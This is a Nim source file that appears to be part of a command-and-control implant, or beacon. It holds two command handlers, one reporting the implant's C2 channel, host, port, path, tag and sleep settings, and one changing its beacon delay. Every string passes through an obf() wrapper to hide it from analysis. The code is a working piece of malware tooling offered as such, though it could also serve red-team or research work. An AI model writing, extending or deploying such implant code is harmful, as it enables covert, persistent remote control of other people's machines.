import std/[parseutils, strutils]
import ../utils/global
import execution

proc run_config*(args: string; buf: var openArray[char]): int =
  # Writes the current implant config into the output buffer
  discard args
  let sec = if beaconDelay <= 0: 5 else: beaconDelay
  let msg =
    obf("channel: ") & channel & '\n' &
    obf("host: ") & host & '\n' &
    obf("port: ") & port & '\n' &
    obf("path: ") & path & '\n' &
    obf("tag: ") & hostTag & '\n' &
    obf("delay: ") & $sec & '\n' &
    obf("pipeline: ") & pipelineTarget & '\n' &
    obf("workers: ") & $bgWorkers
  writeMsg(msg, buf)

proc run_delay*(args: string; buf: var openArray[char]): int =
  # Parses the delay in seconds and stores it on the beacon
  let line = args.strip()
  if line.len == 0:
    return writeMsg(obf("Error: usage delay <seconds>"), buf)
  var sec = 0
  if parseInt(line, sec) <= 0 and line != "0":
    return writeMsg(obf("Error: invalid delay"), buf)
  if sec < 0:
    return writeMsg(obf("Error: delay must be >= 0"), buf)
  beaconDelay = sec
  writeMsg(obf("Delay set to ") & $sec & obf(" seconds."), buf)
